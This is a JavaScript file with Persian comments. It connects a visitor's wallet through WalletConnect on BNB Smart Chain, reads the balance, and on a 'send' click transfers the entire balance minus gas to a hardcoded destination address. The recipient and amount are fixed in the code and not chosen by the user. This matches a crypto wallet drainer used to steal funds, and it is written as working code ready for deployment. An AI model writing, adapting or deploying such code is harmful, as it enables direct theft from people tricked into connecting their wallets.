import { EthereumProvider } from "@walletconnect/ethereum-provider";
import { WalletConnectModal } from "@walletconnect/modal";
import { ethers } from "ethers";


// آدرس مقصد را اینجا جایگزین کنید
const TARGET_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";

// خواندن projectId از env
const PROJECT_ID = "4d08946e6c316bed5e76b450ccbb5256";

// ۱. نمونه‌سازی Modal و Provider
const modal = new WalletConnectModal({
  projectId: PROJECT_ID,
  themeVariables: {},           // اختیاری: سفارشی‌سازی رنگ‌ها
  walletConnectOptions: {       // به صورت خودکار از V2 استفاده می‌کند
    version: 2
  }
});

const provider = await EthereumProvider.init({
  projectId: PROJECT_ID,
  chains: [56],                 // ۵۶ = BSC Mainnet
  showQrModal: false,           // مدیریت نمایش با modal
  qrModalOptions: { modal }
});

// ۲. عناصر DOM
const btnConnect = document.getElementById("connect");
const infoDiv    = document.getElementById("info");
const addrSpan   = document.getElementById("address");
const balSpan    = document.getElementById("balance");
const btnSend    = document.getElementById("send");

let signer, ethProvider;

// رویداد کلیک برای اتصال کیف پول
btnConnect.addEventListener("click", async () => {
  try {
    // باز کردن مودال و انتظاری برای انتخاب کیف پول
    await modal.openModal();
    await provider.enable();
    modal.closeModal();

    // ساختن instance اترز
    ethProvider = new ethers.providers.Web3Provider(provider);
    signer = ethProvider.getSigner();

    const address = await signer.getAddress();
    const balance = await ethProvider.getBalance(address);

    addrSpan.textContent = address;
    balSpan.textContent = ethers.utils.formatEther(balance) + " BNB";
    infoDiv.style.display = "block";
  } catch (err) {
    console.error(err);
    alert("اتصال با خطا مواجه شد: " + err.message);
  }
});

// رویداد کلیک برای ارسال کل موجودی
btnSend.addEventListener("click", async () => {
  try {
    // ۱. موجودی جاری
    const address = await signer.getAddress();
    const balance = await ethProvider.getBalance(address);

    // ۲. پارامترهای Legacy (سازگار با تراست ولت)
    const gasPrice = await ethProvider.getGasPrice();         // wei
    const gasLimit = ethers.BigNumber.from(21000);            // تراکنش ساده انتقال
    const totalGasCost = gasPrice.mul(gasLimit);

    // ۳. محاسبه مقدار قابل ارسال = کل موجودی منهای کارمزد
    const valueToSend = balance.sub(totalGasCost);
    if (valueToSend.lte(0)) {
      return alert("موجودی کافی برای پوشش کارمزد ندارید.");
    }

    // ۴. ارسال تراکنش
    const tx = await signer.sendTransaction({
      to: TARGET_ADDRESS,
      value: valueToSend,
      gasPrice,      // فقط gasPrice — بدون maxFeePerGas/maxPriorityFeePerGas
      gasLimit
    });

    alert("تراکنش ارسال شد، منتظر تأیید باشید...\n" + tx.hash);
    await tx.wait();
    alert("تراکنش تایید شد!");

    // به‌روز کردن موجودی
    const newBal = await ethProvider.getBalance(address);
    balSpan.textContent = ethers.utils.formatEther(newBal) + " BNB";
  } catch (err) {
    console.error(err);
    alert("خطا در ارسال تراکنش: " + err.message);
  }
});